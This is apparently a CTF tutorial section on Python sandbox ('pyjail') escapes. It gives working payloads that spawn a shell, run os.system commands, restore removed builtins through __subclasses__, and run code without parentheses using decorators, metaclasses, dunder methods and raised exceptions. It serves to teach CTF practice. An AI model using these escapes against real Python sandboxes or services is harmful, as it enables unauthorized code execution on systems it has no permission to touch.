Pyjail! What is pyjail? A pyjail challenge is a challenge where the user is given the opportunity to run their input in a python `eval` or `exec` call. 
That seems great right? Free RCE!
Well, there's a catch. There's always a catch. 
What exactly that catch is varies from challenge to challenge, but typically there are 
function whitelists or blacklists, character whitelists or blacklists, removal of the builtins, a combination of these or an a different trick.
In this section we document some ways around common pyjail problems.

## General tips and tricks
In general, the goal is to get a flag. Typically this takes the form of requiring RCE and reading a flag.txt filein the same directory as the challenge. 
Some useful ways to get some RCE:
* Spawn a shell 
  * `__import__("pty").spawn("/bin/bash")`
* Run commands
  * `__import__("os").system("ls")`

Other times you can run from a limited characterset, see if you can run `help()` or `breakpoint()`, 
these will give you a new shell with which to run things unbound by the original character limit.

## No access to builtins
The most common problem faced in a pyjail challenge is the removal of builtins. 
This means you can't use normal functions like `print` or `open`.
To get access back to your builtins, you can go digging through the classes you have available. 
In python you can get to the classes available with `''.__class__.__base__.__subclasses__()`.
This works because the string object in python, defined with `''`, has a class, which is walked up a level with `__base__` to get the object class, and finally you can get the classes that inherit from that object class with `.__subclasses__`.
Note that this works with pretty much any starting class, including an empty dictionary, empty tuple, or int.

From there, you can revore builtins like so:

```
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
```

## Not allowed to call functions
When you aren't allowed to explicitly run functions, there are still some solutions.
For example, class decorators can be used to run functions without actually running them. For example:
```@eval
@'__import__("os").system("sh")'.format
class X:pass
```
Is equivalent to:
```
X = '__import__("os").system("sh")'.format(X)  # just gives you the string
X = eval(X)  # runs the string
```
Or if you don't have parentheses:
```
@exec
@input
class X:
    pass
 ```
 Is equivalent to:
 ```
class X:
    pass
X = input(X)
X = exec(X)
```
Another trick to not using parentheses is to use python's built in helper classes. 
For example `__add__` is called when you add something to a class and `__sub__` is called when you subtract from it.
There are many many of these to choose from based on what you are allowed to do.
So this code will run ls:
```
class X:
  __add__ = eval
 
x = X()
x + '__import__("os").system("ls")'
```
Of course, the astute among you will notice that by calling the constructor `X()` we have called a function and will be blocked.
You would be correct.
So how do we construct a class without calling a constructor? 
One option is to use meta classes to access these attributes without calling a constructor. This looks like:
```
class Metaclass(type):
    __getitem__ = exec # So Sub[string] will execute exec(string)
    
class Sub(metaclass=Metaclass): 
    pass 

Sub['import os; os.system("sh")']
```
Another option is to make your custom class an exception, raise it, and catch it. 
This gives you an instance of your class without actually calling the constructor.
```
class X(Exception):
  __add__ = exec
  
try:
  raise X
except X as x:
  x + 'import os; os.system("sh")'
```



